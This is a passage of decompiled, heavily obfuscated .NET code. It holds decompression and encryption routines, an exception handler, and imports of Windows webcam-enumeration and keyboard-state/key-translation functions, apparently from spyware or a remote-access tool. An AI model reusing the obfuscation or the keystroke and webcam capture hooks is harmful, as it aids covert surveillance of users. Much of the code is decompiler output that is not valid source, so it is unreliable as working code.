        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
    }

    static unsafe int \u0001([In] \u0003.\u0004.\u0007 obj0, [In] int obj1)
    {
      void* voidPtr;
      int num1;
      do
      {
        num1 = 8;
        if (num1 != 0)
        {
          // ISSUE: untyped stack allocation
          voidPtr = (void*) __untypedstackalloc(num1);
          try
          {
            do
            {
              *(int*) voidPtr = 0;
            }
            while (false);
            int num2;
            for (; obj1 >= 4; obj1 = num2)
            {
              if (true)
                *(int*) voidPtr = *(int*) voidPtr + 2;
              int num3 = obj1;
              while (true)
              {
                num2 = num3 >> 1;
                if (false)
                  num3 = num2;
                else
                  break;
              }
            }
            *(int*) ((IntPtr) voidPtr + 4) = *(int*) voidPtr + obj1;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
            \u0003.\u0004.\u0007 obj = obj0;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) obj1;
            \u0006.\u0007.\u0001(ex, (object) local1, (object) obj, (object) local2);
            throw;
          }
        }
        else
          goto label_6;
      }
      while (false);
      goto label_14;
label_6:
      return num1;
label_14:
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    static bool \u0001([In] \u0003.\u0004.\u0006 obj0)
    {
      bool flag;
      try
      {
        do
        {
          int num;
          if (obj0.\u0001 != 30)
          {
            num = 0;
            if (num == 0)
              flag = num != 0;
            else
              goto label_4;
          }
          else
            goto label_3;
label_2:
          continue;
label_3:
          num = \u0006.\u0007.\u0001(obj0.\u0001) ? 1 : 0;
label_4:
          flag = num != 0;
          if (false)
            goto label_2;
          else
            break;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0006 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    [DllImport("avicap32.dll", EntryPoint = "capGetDriverDescriptionA", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern bool \u0001(
      short _param0,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1,
      int _param2,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param3,
      int _param4);

    [DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
    static extern int \u0001(
      uint _param0,
      uint _param1,
      byte[] _param2,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder _param3,
      int _param4,
      uint _param5,
      IntPtr _param6);

    static void \u0001([In] IWebProxy obj0, [In] \u0005.\u0002 obj1) => obj1.\u0001 = obj0;

    static void \u0001([In] \u0003.\u0004.\u000E obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
        obj0.\u0001 |= (uint) (obj1 << obj0.\u0003);
        obj0.\u0003 += obj2;
        if (obj0.\u0003 < 16)
          return;
        do
        {
          if (true)
            goto label_5;
label_2:
          continue;
label_5:
          byte[] numArray1 = obj0.\u0001;
          \u0003.\u0004.\u000E obj = obj0;
          int num2;
          num1 = num2 = obj.\u0002;
          obj.\u0002 = num2 + 1;
          int index1 = num1;
          int num3 = (int) (byte) obj0.\u0001;
          numArray1[index1] = (byte) num3;
          byte[] numArray2 = obj0.\u0001;
          num1 = obj0.\u0002++;
          int index2 = num1;
          int num4 = (int) (byte) (obj0.\u0001 >> 8);
          numArray2[index2] = (byte) num4;
          obj0.\u0001 >>= 16;
          goto label_2;
        }
        while (false);
        obj0.\u0003 -= 16;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u0003.\u0004.\u000E obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj2;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) obj, (object) local2, (object) local3);
        throw;
      }
    }

    static unsafe int \u0001([In] \u0003.\u0004.\u0002 obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(12);
      if (true)
        goto label_20;
label_1:
      void* voidPtr;
      int num2;
      try
      {
        *(int*) voidPtr = 0;
label_3:
        int num3 = obj0.\u0003;
        int num4;
        for (int index = 0; num3 > index && obj3 > 0; num3 = num4)
        {
          obj1[obj2++] = (byte) obj0.\u0001;
          obj0.\u0001 >>= 8;
          obj0.\u0003 -= 8;
          num4 = obj3;
          int num5 = 1;
          if (num5 != 0)
          {
            int num6 = num4 - num5;
            if (true)
              obj3 = num6;
            *(int*) voidPtr = *(int*) voidPtr + 1;
            goto label_3;
          }
          else
            index = num5;
        }
        if (obj3 == 0)
        {
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
        }
        else
        {
          *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0002 - obj0.\u0001;
          if (obj3 > *(int*) ((IntPtr) voidPtr + 4))
          {
            if (true)
              obj3 = *(int*) ((IntPtr) voidPtr + 4);
            else
              goto label_12;
          }
          Array.Copy((Array) obj0.\u0001, obj0.\u0001, (Array) obj1, obj2, obj3);
          if (true)
            obj0.\u0001 += obj3;
          else
            goto label_19;
label_12:
          if ((obj0.\u0001 - obj0.\u0002 & 1) != 0)
          {
            \u0003.\u0004.\u0002 obj = obj0;
            byte[] numArray = obj0.\u0001;
            num2 = obj0.\u0001++;
            int index = num2;
            int num7 = (int) numArray[index] & (int) byte.MaxValue;
            obj.\u0001 = (uint) num7;
            obj0.\u0003 = 8;
          }
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr + obj3;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num2;
        \u0003.\u0004.\u0002 obj = obj0;
        byte[] numArray = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) obj3;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) obj, (object) numArray, (object) local4, (object) local5);
        throw;
      }
label_19:
      return *(int*) ((IntPtr) voidPtr + 8);
label_20:
      voidPtr = (void*) num1;
      goto label_1;
    }

    [DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
    static extern bool \u0001([In] byte[] obj0);

    static int \u0001([In] Font obj0, [In] string obj1, [In] Graphics obj2, [In] int obj3)
    {
      int num;
      try
      {
        if (true)
        {
          num = \u0006.\u0007.\u0001(obj0, obj2, obj3, obj1);
          goto label_6;
        }
        else
          goto label_6;
      }
      catch (Exception ex1)
      {
        try
        {
          do
          {
            num = \u0088\u0003.\u0011\u0006((double) \u0006.\u0007.\u0001(obj3, obj1, obj2, obj0) * 1.1);
          }
          while (false);
          goto label_6;
        }
        catch (Exception ex2)
        {
        }
      }
      return 0;
label_6:
      return num;
    }

    static \u0006.\u0006 \u0001()
    {
      System.Type[] typeArray;
      if (true)
      {
        if (\u0006.\u0006.\u0001 == null)
          typeArray = \u0089\u0003.\u007E\u0012\u0006((object) \u0097.\u001B\u0003());
        else
          goto label_15;
      }
      else
        goto label_18;
label_3:
      int num = 0;
      int index;
      if (num == 0)
      {
        index = num;
        goto label_12;
      }
      else
        goto label_13;
label_9:
      ++num;
label_10:
      if (true)
        index = num;
      else
        goto label_9;
label_12:
      num = index;
label_13:
      System.Type type;
      if (true)
      {
        if (num < typeArray.Length)
        {
          type = typeArray[index];
          goto label_18;
        }
      }
      else
        goto label_10;
label_15:
      return \u0006.\u0006.\u0001;
label_18:
      if ((object) type != null && (object) \u0094\u0002.\u007E\u0014\u0005((object) type) != null)
      {
        // ISSUE: type reference
        if ((object) \u0094\u0002.\u007E\u0014\u0005((object) type) == (object) \u0013.\u001C(__typeref (\u0006.\u0006)))
        {
          try
          {
            \u0006.\u0006.\u0001 = (\u0006.\u0006) \u008A\u0003.\u0013\u0006(type, true);
            if (\u0006.\u0006.\u0001 != null)
              goto label_15;
          }
          catch
          {
          }
        }
      }
      if (true)
      {
        num = index;
        goto label_9;
      }
      else
        goto label_3;
    }

    static void \u0001([In] bool obj0, [In] \u0008.\u0007 obj1)
    {
label_0:
      if (true)
        \u0012\u0002.\u007E\u0082\u0004((object) obj1.\u0001, obj0);
      do
      {
        do
        {
          obj1.\u0001 = 0;
          if (false)
            goto label_0;
        }
        while (false);
        \u009B obj2 = \u009B.\u007E\u0083\u0003;
        \u0008.\u0007 obj3 = obj1;
        if (true)
          goto label_7;
label_5:
        continue;
label_7:
        obj2((object) obj3);
        goto label_5;
      }
      while (false);
    }

    static bool \u0001([In] \u0005.\u0002.\u0003 obj0, [In] byte[] obj1, [In] \u0005.\u0002 obj2)
    {
      byte[] numArray1;
      bool flag;
      try
      {
        numArray1 = \u0006.\u0007.\u0001(obj1);
      }
      catch (Exception ex)
      {
        \u0006.\u0007.\u0001(obj2, \u000E.\u0002.\u0001, \u0003.\u0004.\u0001);
        flag = false;
        goto label_9;
      }
      if (true)
        goto label_11;
label_6:
      \u0008.\u0008 obj3 = new \u0008.\u0008(\u0006.\u0007.\u001F(3734));
      if (obj2.\u0001 != null)
      {
        obj3.\u0001 = obj2.\u0001;
        goto label_8;
      }
      else
        goto label_8;
label_11:
      byte[] numArray2 = \u0006.\u0007.\u0001(numArray1, \u0006.\u0007.\u001F(1153));
      byte[] numArray3;
      if (true)
        numArray3 = numArray2;
      if (numArray3 != null)
      {
        \u0006.\u0007.\u0001(obj2, \u000E.\u0002.\u0002);
        goto label_6;
      }
      else
      {
        \u0006.\u0007.\u0001(obj2, \u000E.\u0002.\u0001, \u0007.\u0002.\u0001);
        int num = 0;
        return num != 0 ? num != 0 : num != 0;
      }
label_8:
      \u0005.\u0002.\u0001 obj4 = new \u0005.\u0002.\u0001(obj2, numArray3, obj3, obj0);
      \u0006.\u0007.\u0001(new \u0008.\u0005(obj4.\u0001), obj3);
      return obj4.\u0001;
label_9:
      if (true)
        return flag;
      goto label_8;
    }

    static void \u0001([In] \u0008.\u0006 obj0)
    {
      do
      {
        \u0012\u0002.\u007E\u0082\u0004((object) obj0.\u0001, false);
      }
      while (false);
      if (false)
        goto label_4;
      else
        goto label_6;
label_3:
      \u009B.\u007E\u0083\u0003((object) obj0);
label_4:
      if (true)
      {
        \u000E\u0002.\u0011\u0004((object) obj0, 16);
        return;
      }
      goto label_3;
label_6:
      obj0.\u0001 = (Image) null;
      if (true)
      {
        if (true)
          obj0.\u0001 = false;
        else
          goto label_4;
      }
      obj0.\u0001 = string.Empty;
      goto label_3;
    }

    static unsafe void \u0001([In] \u0003.\u0004.\u0004 obj0, [In] byte[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(68);
      int[] numArray1;
      int[] numArray2;
      int[] numArray3;
      int index;
      try
      {
        numArray1 = new int[16];
        numArray3 = new int[16];
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < obj1.Length)
        {
          *(int*) ((IntPtr) voidPtr + 4) = (int) obj1[*(int*) voidPtr];
          if (*(int*) ((IntPtr) voidPtr + 4) > 0)
            (numArray2 = numArray1)[index = *(int*) ((IntPtr) voidPtr + 4)] = numArray2[(IntPtr) index] + 1;
          *(int*) voidPtr = *(int*) voidPtr + 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = 0;
        *(int*) ((IntPtr) voidPtr + 12) = 512;
        *(int*) ((IntPtr) voidPtr + 16) = 1;
        while (*(int*) ((IntPtr) voidPtr + 16) <= 15)
        {
          numArray3[*(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 8);
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + (numArray1[*(int*) ((IntPtr) voidPtr + 16)] << 16 - *(int*) ((IntPtr) voidPtr + 16));
          if (*(int*) ((IntPtr) voidPtr + 16) >= 10)
          {
            *(int*) ((IntPtr) voidPtr + 20) = numArray3[*(int*) ((IntPtr) voidPtr + 16)] & 130944;
            *(int*) ((IntPtr) voidPtr + 24) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (*(int*) ((IntPtr) voidPtr + 24) - *(int*) ((IntPtr) voidPtr + 20) >> 16 - *(int*) ((IntPtr) voidPtr + 16));
          }
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
        }
        obj0.\u0001 = new short[*(int*) ((IntPtr) voidPtr + 12)];
        *(int*) ((IntPtr) voidPtr + 28) = 512;
        *(int*) ((IntPtr) voidPtr + 32) = 15;
        while (*(int*) ((IntPtr) voidPtr + 32) >= 10)
        {
          *(int*) ((IntPtr) voidPtr + 36) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - (numArray1[*(int*) ((IntPtr) voidPtr + 32)] << 16 - *(int*) ((IntPtr) voidPtr + 32));
          *(int*) ((IntPtr) voidPtr + 40) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
          *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 40);
          while (*(int*) ((IntPtr) voidPtr + 44) < *(int*) ((IntPtr) voidPtr + 36))
          {
            obj0.\u0001[(int) \u0006.\u0007.\u0001(*(int*) ((IntPtr) voidPtr + 44))] = (short) (-*(int*) ((IntPtr) voidPtr + 28) << 4 | *(int*) ((IntPtr) voidPtr + 32));
            *(int*) ((IntPtr) voidPtr + 28) = *(int*) ((IntPtr) voidPtr + 28) + (1 << *(int*) ((IntPtr) voidPtr + 32) - 9);
            *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 44) + 128;
          }
          *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
        }
        *(int*) ((IntPtr) voidPtr + 48) = 0;
        while (*(int*) ((IntPtr) voidPtr + 48) < obj1.Length)
        {
          *(int*) ((IntPtr) voidPtr + 52) = (int) obj1[*(int*) ((IntPtr) voidPtr + 48)];
          if (*(int*) ((IntPtr) voidPtr + 52) != 0)
          {
            *(int*) ((IntPtr) voidPtr + 8) = numArray3[*(int*) ((IntPtr) voidPtr + 52)];
            *(int*) ((IntPtr) voidPtr + 56) = (int) \u0006.\u0007.\u0001(*(int*) ((IntPtr) voidPtr + 8));
            if (*(int*) ((IntPtr) voidPtr + 52) <= 9)
            {
              do
              {
                obj0.\u0001[*(int*) ((IntPtr) voidPtr + 56)] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
              }
              while (*(int*) ((IntPtr) voidPtr + 56) < 512);
            }
            else
            {
              *(int*) ((IntPtr) voidPtr + 60) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 56) & 511];
              *(int*) ((IntPtr) voidPtr + 64) = 1 << (*(int*) ((IntPtr) voidPtr + 60) & 15);
              *(int*) ((IntPtr) voidPtr + 60) = -(*(int*) ((IntPtr) voidPtr + 60) >> 4);
              do
              {
                obj0.\u0001[*(int*) ((IntPtr) voidPtr + 60) | *(int*) ((IntPtr) voidPtr + 56) >> 9] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
              }
              while (*(int*) ((IntPtr) voidPtr + 56) < *(int*) ((IntPtr) voidPtr + 64));
            }
            numArray3[*(int*) ((IntPtr) voidPtr + 52)] = *(int*) ((IntPtr) voidPtr + 8) + (1 << 16 - *(int*) ((IntPtr) voidPtr + 52));
          }
          *(int*) ((IntPtr) voidPtr + 48) = *(int*) ((IntPtr) voidPtr + 48) + 1;
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[23]
        {
          (object) numArray1,
          (object) numArray3,
          (object) *(int*) voidPtr,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 20),
          (object) *(int*) ((IntPtr) voidPtr + 24),
          (object) *(int*) ((IntPtr) voidPtr + 28),
          (object) *(int*) ((IntPtr) voidPtr + 32),
          (object) *(int*) ((IntPtr) voidPtr + 36),
          (object) *(int*) ((IntPtr) voidPtr + 40),
          (object) *(int*) ((IntPtr) voidPtr + 44),
          (object) *(int*) ((IntPtr) voidPtr + 48),
          (object) *(int*) ((IntPtr) voidPtr + 52),
          (object) *(int*) ((IntPtr) voidPtr + 56),
          (object) *(int*) ((IntPtr) voidPtr + 60),
          (object) *(int*) ((IntPtr) voidPtr + 64),
          (object) numArray2,
          (object) (IntPtr) index,
          (object) obj0,
          (object) obj1
        };
        \u0006.\u0007.\u0001(ex, objArray);
        throw;
      }
    }

    [SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
    static void \u0001([In] \u0006.\u0006 obj0)
    {
      do
      {
        if (obj0 != null)
          goto label_4;
label_3:
        continue;
label_4:
        \u0006.\u0006.\u0001 = obj0;
        // ISSUE: method pointer
        \u008B\u0003.\u007E\u0014\u0006((object) \u007F\u0003.\u0003\u0006(), new UnhandledExceptionEventHandler((object) obj0, __methodptr(\u0001)));
        if (true)
        {
          \u008C\u0003 obj = \u008C\u0003.\u0015\u0006;
          // ISSUE: method pointer
          ThreadExceptionEventHandler exceptionEventHandler = new ThreadExceptionEventHandler((object) obj0, __methodptr(\u0001));
          if (true)
          {
            obj(exceptionEventHandler);
            goto label_3;
          }
          else
            goto label_3;
        }
      }
      while (false);
    }

    static void \u0001([In] \u0003.\u0004.\u0003 obj0, [In] int obj1, [In] int obj2)
    {
      int sourceIndex;
      int num1;
      int num2;
      try
      {
        int num3;
        int num4;
        int num5;
        if (true)
        {
          if (true)
          {
            num2 = (obj0.\u0002 += obj1);
            int num6 = num2;
            if (true)
            {
              if (num6 > 32768)
                throw new InvalidOperationException();
              int num7 = obj0.\u0001 - obj2;
              num4 = (int) short.MaxValue;
              num3 = num7;
            }
            else
            {
              num5 = num6;
              goto label_20;
            }
          }
          else
            goto label_10;
        }
        else
          goto label_12;
label_6:
        sourceIndex = num3 & num4;
        num5 = 32768;
        goto label_20;
label_10:
        int num8 = obj0.\u0001;
        int num9 = num1;
        int num10 = num8;
label_11:
        if (num10 >= num9)
          goto label_17;
label_12:
        if (obj1 <= obj2)
        {
          Array.Copy((Array) obj0.\u0001, sourceIndex, (Array) obj0.\u0001, obj0.\u0001, obj1);
          obj0.\u0001 += obj1;
          return;
        }
        while (true)
        {
          num3 = obj1;
          num4 = num3 - 1;
          if (true)
          {
            obj1 = num4;
            if (num3 > 0)
            {
              byte[] numArray = obj0.\u0001;
              num2 = obj0.\u0001++;
              int index = num2;
              int num11 = (int) obj0.\u0001[sourceIndex++];
              numArray[index] = (byte) num11;
            }
            else
              break;
          }
          else
            goto label_6;
        }
        return;
label_17:
        \u0006.\u0007.\u0001(obj0, sourceIndex, obj1, obj2);
        return;
label_20:
        int num12 = obj1;
        int num13 = num5 - num12;
        if (true)
          goto label_21;
label_7:
        num10 = sourceIndex;
        num9 = num1;
        if (true)
        {
          if (false)
          {
            num4 = num9;
            num3 = num10;
            goto label_6;
          }
          else if (num10 > num9)
            goto label_17;
          else
            goto label_10;
        }
        else
          goto label_11;
label_21:
        num1 = num13;
        goto label_7;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) sourceIndex;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num2;
        \u0003.\u0004.\u0003 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) obj2;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) obj, (object) local4, (object) local5);
        throw;
      }
    }

    [DllImport("shell32", EntryPoint = "ExtractIconEx")]
    static extern int \u0001([In] string obj0, [In] int obj1, [In] ref int obj2, [In] ref int obj3, [In] int obj4);

    static byte[] \u0001([In] ref string obj0, [In] \u0001 obj1)
    {
      byte[] numArray1;
      try
      {
        numArray1 = \u0083\u0002.\u007E\u0099\u0004((object) \u0091.\u0011\u0003(), obj0);
      }
      catch (Exception ex)
      {
        byte[] numArray2;
        byte[] numArray3 = numArray2;
        \u0001 obj = obj1;
        string str = obj0;
        \u0006.\u0007.\u0001(ex, (object) numArray3, (object) obj, (object) str);
        throw;
      }
      return numArray1;
    }

    static Exception \u0001([In] \u0003.\u0005 obj0) => obj0.\u0001;

    static byte[] \u0001([In] byte[] obj0, [In] string obj1)
    {
      if (\u0015.\u007E\u0080((object) obj1, \u0006.\u0007.\u001F(3783)))
      {
        \u0007.\u0002.\u0001 = \u0006.\u0007.\u001F(3788);
        return (byte[]) null;
      }
      RijndaelManaged rijndaelManaged = (RijndaelManaged) null;
      RSACryptoServiceProvider cryptoServiceProvider = (RSACryptoServiceProvider) null;
      if (true)
        goto label_28;
label_3:
      CryptoStream cryptoStream = (CryptoStream) null;
      MemoryStream memoryStream;
      try
      {
        rijndaelManaged = new RijndaelManaged();
        cryptoServiceProvider = new RSACryptoServiceProvider();
        \u000F\u0002.\u007E\u0013\u0004((object) cryptoServiceProvider, obj1);
        if (true)
          \u009B.\u007E\u0089\u0003((object) rijndaelManaged);
        \u009B.\u007E\u008A\u0003((object) rijndaelManaged);
        byte[] numArray1 = new byte[48];
        \u008D\u0003.\u0016\u0006((Array) \u0019\u0003.\u007E\u009A\u0005((object) rijndaelManaged), 0, (Array) numArray1, 0, 32);
        \u008D\u0003.\u0016\u0006((Array) \u0019\u0003.\u007E\u009B\u0005((object) rijndaelManaged), 0, (Array) numArray1, 32, 16);
        memoryStream = new MemoryStream();
        try
        {
          byte[] numArray2;
          do
          {
            numArray2 = \u008E\u0003.\u007E\u0018\u0006((object) cryptoServiceProvider, numArray1, false);
            \u008F\u0003.\u007E\u0019\u0006((object) memoryStream, (byte) 1);
            \u008F\u0003.\u007E\u0019\u0006((object) memoryStream, \u0090\u0003.\u001A\u0006(numArray2.Length / 8));
          }
          while (false);
          \u0084\u0002.\u007E\u009A\u0004((object) memoryStream, numArray2, 0, numArray2.Length);
        }
        catch (CryptographicException ex1)
        {
          try
          {
            byte[] numArray3;
            if (true)
              numArray3 = new byte[16];
label_12:
            byte[] numArray4 = new byte[16];
            \u008D\u0003.\u0016\u0006((Array) \u0019\u0003.\u007E\u009A\u0005((object) rijndaelManaged), 0, (Array) numArray3, 0, 16);
            \u008D\u0003.\u0016\u0006((Array) \u0019\u0003.\u007E\u009A\u0005((object) rijndaelManaged), 16, (Array) numArray4, 0, 16);
            byte[] numArray5 = \u008E\u0003.\u007E\u0018\u0006((object) cryptoServiceProvider, numArray3, false);
            byte[] numArray6;
            byte[] numArray7;
            do
            {
              numArray6 = \u008E\u0003.\u007E\u0018\u0006((object) cryptoServiceProvider, numArray4, false);
              numArray7 = \u008E\u0003.\u007E\u0018\u0006((object) cryptoServiceProvider, \u0019\u0003.\u007E\u009B\u0005((object) rijndaelManaged), false);
              \u008F\u0003.\u007E\u0019\u0006((object) memoryStream, (byte) 2);
              if (false)
                goto label_12;
            }
            while (false);
            \u008F\u0003.\u007E\u0019\u0006((object) memoryStream, \u0090\u0003.\u001A\u0006(numArray5.Length / 8));
            \u0084\u0002.\u007E\u009A\u0004((object) memoryStream, numArray5, 0, numArray5.Length);
            \u0084\u0002.\u007E\u009A\u0004((object) memoryStream, numArray6, 0, numArray6.Length);
            \u0084\u0002.\u007E\u009A\u0004((object) memoryStream, numArray7, 0, numArray7.Length);
          }
          catch (CryptographicException ex2)
          {
            \u0007.\u0002.\u0001 = \u0006.\u0007.\u001F(3881);
            return (byte[]) null;
          }
        }
        cryptoStream = new CryptoStream((Stream) memoryStream, \u0091\u0003.\u007E\u001B\u0006((object) rijndaelManaged), CryptoStreamMode.Write);
        \u0084\u0002.\u007E\u009A\u0004((object) cryptoStream, obj0, 0, obj0.Length);
        \u009B.\u007E\u008B\u0003((object) cryptoStream);
        return \u0019\u0003.\u007E\u0099\u0005((object) memoryStream);
      }
      catch (Exception ex)
      {
        \u0007.\u0002.\u0001 = \u001D.\u0099(\u0006.\u0007.\u001F(4087), \u001E.\u007E\u0004\u0002((object) ex));
        return (byte[]) null;
      }
      finally
      {
        if (rijndaelManaged != null)
          \u009B.\u007E\u008C\u0003((object) rijndaelManaged);
        if (cryptoServiceProvider != null)
          \u009B.\u007E\u008D\u0003((object) cryptoServiceProvider);
        if (memoryStream != null)
          \u009B.\u007E\u001F\u0003((object) memoryStream);
        if (cryptoStream != null)
          \u009B.\u007E\u001F\u0003((object) cryptoStream);
      }
label_28:
      memoryStream = (MemoryStream) null;
      goto label_3;
    }

    static void \u0001([In] bool obj0, [In] \u0001 obj1) => obj1.\u0001 = obj0;

    static void \u0001([In] Exception obj0, [In] object obj1)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        \u0006.\u0007.\u0001(obj0, new object[1]
        {
          obj1
        });
        goto label_2;
      }
      while (false);
    }

    static string \u0001([In] \u0001 obj0)
    {
      DateTime dateTime1;
      char[] chArray1;
      string str1;
      Exception exception1;
      try
      {
        try
        {
          do
          {
            DateTime dateTime2 = \u001F\u0002.\u007E\u0094\u0004((object) (FileInfo) obj0.\u0001);
            if (true)
              goto label_2;
label_1:
            ref DateTime local = ref dateTime1;
            chArray1 = new char[10]
            {
              'y',
              'y',
              'y',
              'y',
              '-',
              'M',
              'M',
              '-',
              'd',
              'd'
            };
            string format = new string(chArray1);
            str1 = local.ToString(format);
            continue;
label_2:
            dateTime1 = dateTime2;
            goto label_1;
          }
          while (false);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          chArray1 = new char[7]
          {
            'u',
            'n',
            'k',
            'n',
            'o',
            'w',
            'n'
          };
          str1 = new string(chArray1);
          global::\u0006.\u0006();
        }
        return str1;
      }
      catch (Exception ex)
      {
        string str2 = str1;
        Exception exception2 = exception1;
        char[] chArray2 = chArray1;
        // ISSUE: variable of a boxed type
        __Boxed<DateTime> local = (ValueType) dateTime1;
        \u0001 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) str2, (object) exception2, (object) chArray2, (object) local, (object) obj);
        throw;
      }
    }

    static void \u0001([In] \u0003.\u0004.\u0003 obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      int num1;
      try
      {
        do
        {
          while (true)
          {
            if (true)
            {
              if (true)
              {
                int num2 = obj2;
                int num3 = num2 - 1;
                if (true)
                  goto label_12;
label_3:
                obj1 = num2 & num3;
                continue;
label_12:
                obj2 = num3;
                if (num2 > 0)
                {
                  byte[] numArray = obj0.\u0001;
                  \u0003.\u0004.\u0003 obj = obj0;
                  int num4 = obj.\u0001;
                  if (true)
                    goto label_10;
label_1:
                  obj.\u0001 = num4 + 1;
                  int index = num1;
                  int num5 = (int) obj0.\u0001[obj1++];
                  numArray[index] = (byte) num5;
                  if (true)
                    obj0.\u0001 &= (int) short.MaxValue;
                  int num6 = obj1;
                  num3 = (int) short.MaxValue;
                  num2 = num6;
                  goto label_3;
label_10:
                  num1 = num4;
                  goto label_1;
                }
                else
                  break;
              }
              else
                break;
            }
            else
              goto label_0;
          }
        }
        while (false);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u0003.\u0004.\u0003 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj3;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) obj, (object) local2, (object) local3, (object) local4);
        throw;
      }
    }

    static \u0007() => \u0004.\u0002.\u0001(typeof (\u0006.\u0007));
  }
}
